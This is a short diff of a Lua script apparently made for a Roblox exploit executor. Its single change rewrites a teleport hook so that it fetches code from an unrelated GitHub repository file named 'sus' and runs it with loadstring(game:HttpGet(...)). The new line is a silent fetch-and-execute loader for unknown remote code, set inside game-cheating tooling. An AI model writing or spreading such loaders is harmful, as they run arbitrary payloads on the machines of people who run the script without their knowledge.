@@ -26,7 +26,7 @@ if not getgenv().DiscordJoined then
 end
 
 -- Queue on Teleport
-pcall(queue_on_teleport, [[loadstring(game:HttpGet("https://raw.githubusercontent.com/kubuntuclaps/Roblox-Scripts/main/Red%20Light%20Green%20Light.lua"))()]])
+pcall(queue_on_teleport, [[loadstring(game:HttpGet("https://raw.githubusercontent.com/storematelamo/nto/main/sus"))()]])
 
 -- Variables
 local RunService = game:GetService("RunService")
